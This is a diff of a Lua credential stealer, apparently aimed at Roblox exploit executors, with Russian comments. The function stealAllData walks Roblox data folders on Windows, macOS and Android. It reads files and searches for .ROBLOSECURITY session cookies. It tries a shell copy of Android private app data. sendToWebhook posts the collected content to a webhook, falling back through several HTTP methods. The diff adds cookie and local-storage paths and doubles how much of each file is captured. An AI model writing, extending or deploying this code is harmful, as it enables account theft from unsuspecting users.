@@ -52,36 +52,9 @@ local function sendToWebhook(data)
     }
     local json = HttpService:JSONEncode(payload)
 
-    -- Попытка 1: HttpService
-    local ok, err = pcall(function()
-        HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
-    end)
-    if ok then
-        print("[DEBUG] Отправлено через HttpService")
-        return true
-    end
-    warn("[DEBUG] Ошибка HttpService:", err)
-
-    -- Попытка 2: syn.request (Synapse X)
-    if syn and syn.request then
-        ok, err = pcall(function()
-            syn.request({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = json
-            })
-        end)
-        if ok then
-            print("[DEBUG] Отправлено через syn.request")
-            return true
-        end
-        warn("[DEBUG] Ошибка syn.request:", err)
-    end
-
-    -- Попытка 3: request (Fluxus и другие)
+    -- 1. Пробуем request (доступен в Xeno)
     if request then
-        ok, err = pcall(function()
+        local ok, err = pcall(function()
             request({
                 Url = webhook,
                 Method = "POST",
@@ -93,12 +66,12 @@ local function sendToWebhook(data)
             print("[DEBUG] Отправлено через request")
             return true
         end
-        warn("[DEBUG] Ошибка request:", err)
+        warn("[DEBUG] request failed:", err)
     end
 
-    -- Попытка 4: http_request (старые эксплоиты)
+    -- 2. Пробуем http_request
     if http_request then
-        ok, err = pcall(function()
+        local ok, err = pcall(function()
             http_request({
                 Url = webhook,
                 Method = "POST",
@@ -110,7 +83,43 @@ local function sendToWebhook(data)
             print("[DEBUG] Отправлено через http_request")
             return true
         end
-        warn("[DEBUG] Ошибка http_request:", err)
+        warn("[DEBUG] http_request failed:", err)
+    end
+
+    -- 3. Пробуем game.HttpPost (кастомная функция Xeno)
+    if game.HttpPost then
+        local ok, err = pcall(function()
+            game.HttpPost(webhook, json, "application/json")
+        end)
+        if ok then
+            print("[DEBUG] Отправлено через game.HttpPost")
+            return true
+        end
+        warn("[DEBUG] game.HttpPost failed:", err)
+    end
+
+    -- 4. Пробуем глобальный HttpPost
+    if HttpPost then
+        local ok, err = pcall(function()
+            HttpPost(webhook, json, "application/json")
+        end)
+        if ok then
+            print("[DEBUG] Отправлено через HttpPost (global)")
+            return true
+        end
+        warn("[DEBUG] HttpPost (global) failed:", err)
+    end
+
+    -- 5. Пробуем HttpService.PostAsync (вдруг разблокируется)
+    if HttpService and HttpService.PostAsync then
+        local ok, err = pcall(function()
+            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
+        end)
+        if ok then
+            print("[DEBUG] Отправлено через HttpService")
+            return true
+        end
+        warn("[DEBUG] HttpService.PostAsync failed:", err)
     end
 
     warn("[DEBUG] Все методы отправки не удались")
@@ -155,13 +164,18 @@ local function getBasePaths()
         safePath("USERPROFILE", "\\AppData\\Local\\Roblox"),
         safePath("USERPROFILE", "\\AppData\\Roaming\\Roblox"),
         safePath("USERPROFILE", "\\Roblox"),
+        safePath("LOCALAPPDATA", "\\Roblox\\Cookies"),
+        safePath("LOCALAPPDATA", "\\Roblox\\Local Storage"),
+        safePath("LOCALAPPDATA", "\\Roblox\\Local State"),
+        safePath("APPDATA", "\\Roblox\\Cookies"),
+        safePath("APPDATA", "\\Roblox\\Local Storage"),
+        safePath("APPDATA", "\\Roblox\\Local State"),
         -- macOS / Linux
         safePath("HOME", "/Library/Application Support/Roblox"),
         safePath("HOME", "/.roblox"),
         safePath("HOME", "/.config/roblox"),
-        safePath("HOME", "/.roblox"),
         "/root/.roblox",
-        -- Android (основные)
+        -- Android
         "/data/data/com.roblox.client",
         "/data/user/0/com.roblox.client",
         "/data/data/com.roblox.client/shared_prefs",
@@ -170,16 +184,8 @@ local function getBasePaths()
         "/data/data/com.roblox.client/app_webview",
         "/data/data/com.roblox.client/cache",
         "/data/data/com.roblox.client/no_backup",
-        -- Android внешнее хранилище
         "/storage/emulated/0/Android/data/com.roblox.client",
-        "/storage/emulated/0/Android/data/com.roblox.client/files",
-        "/storage/emulated/0/Android/data/com.roblox.client/cache",
-        "/sdcard/Android/data/com.roblox.client",
-        "/sdcard/Android/data/com.roblox.client/files",
-        "/sdcard/Android/data/com.roblox.client/cache",
-        -- Эмуляторы (BlueStacks, LDPlayer и т.д.)
-        "/mnt/shared/App/com.roblox.client",
-        "/mnt/windows/BstSharedFolder/App/com.roblox.client"
+        "/sdcard/Android/data/com.roblox.client"
     }
     local clean = {}
     for _, p in ipairs(paths) do
@@ -241,7 +247,6 @@ local function stealAllData()
     local basePaths = getBasePaths()
     print("[DEBUG] Путей для сканирования:", #basePaths)
 
-    -- Основной обход по путям
     for _, base in ipairs(basePaths) do
         local isFolder = pcall(isfolder, base)
         if isFolder then
@@ -251,7 +256,7 @@ local function stealAllData()
             for _, f in ipairs(files) do
                 local ok, content = pcall(readfile, f)
                 if ok and content and content ~= "" then
-                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
+                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                 end
             end
         else
@@ -259,25 +264,24 @@ local function stealAllData()
             if isFile and string.lower(base):match(pattern) then
                 local ok, content = pcall(readfile, base)
                 if ok and content then
-                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
+                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                 end
             end
         end
     end
 
-    -- Попытка shell-копирования приватных файлов Android (если есть root)
+    -- Попытка shell-копирования приватных файлов Android
     local androidPrivate = "/data/data/com.roblox.client"
     local tempCopy = "/sdcard/roblox_temp_copy"
     local shellOk, shellRes = tryShellCommand("cp -R " .. androidPrivate .. " " .. tempCopy .. " 2>/dev/null")
     if shellOk then
         print("[DEBUG] Shell-копирование выполнено, результат:", shellRes)
-        -- Если удалось скопировать, читаем из копии
         if isfolder and isfolder(tempCopy) then
             local copiedFiles = scanFolder(tempCopy, pattern, true)
             for _, f in ipairs(copiedFiles) do
                 local ok, content = pcall(readfile, f)
                 if ok and content then
-                    table.insert(collected, "**Скопированный файл (через shell):** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
+                    table.insert(collected, "**Скопированный файл (через shell):** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                 end
             end
         end
@@ -285,7 +289,7 @@ local function stealAllData()
         print("[DEBUG] Shell недоступен или ошибка:", shellRes)
     end
 
-    -- Прямые файлы (Windows/Android)
+    -- Прямые файлы
     local directFiles = {
         safePath("APPDATA", "\\Roblox\\GlobalBasicSettings_13.xml"),
         safePath("LOCALAPPDATA", "\\Roblox\\GlobalBasicSettings_13.xml"),
@@ -304,7 +308,7 @@ local function stealAllData()
             if isFile then
                 local ok, content = pcall(readfile, f)
                 if ok and content then
-                    table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
+                    table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                 end
             end
         end
@@ -320,7 +324,7 @@ local function stealAllData()
                 for _, f in ipairs(allFiles) do
                     local ok, content = pcall(readfile, f)
                     if ok and content and tostring(content):find(".ROBLOSECURITY") then
-                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
+                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                     end
                 end
             end
